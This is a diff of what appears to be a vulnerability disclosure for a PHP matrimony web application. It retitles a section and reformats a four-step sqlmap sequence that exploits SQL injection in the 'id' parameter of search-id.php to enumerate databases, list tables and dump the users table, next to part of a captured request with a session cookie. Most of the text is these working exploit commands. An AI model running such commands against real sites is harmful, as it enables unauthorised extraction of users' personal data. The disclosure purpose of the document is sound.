@@ -25,15 +25,16 @@ Referer: http://localhost/search-id.php
 Accept-Encoding: gzip, deflate, br
 Cookie: PHPSESSID=pvm9s24kls26lgqj0730spgclj
 Connection: keep-alive
-
-## SQL Injection
+````
+## Exploitation Details with Sqlmap Tool
 Using sqlmap tool:
-1. Enumerate Databases
+1. Enumerate Databases:
 python sqlmap.py -r 1 -p id --batch --dbs
-2. Select Target Database (matrimony)
+2. Select Target Database (matrimony):
 python sqlmap.py -r 1 -p id --batch -D matrimony
-3. List Tables in matrimony Database
+3. List Tables in matrimony Database:
 python sqlmap.py -r 1 -p id --batch -D matrimony -tables
-4. Dump Data from users Table
+4. Dump Data from users Table:
 python sqlmap.py -r 1 -p id --batch -D matrimony -T users --dump
+---
 This will lead to leakage of user information.
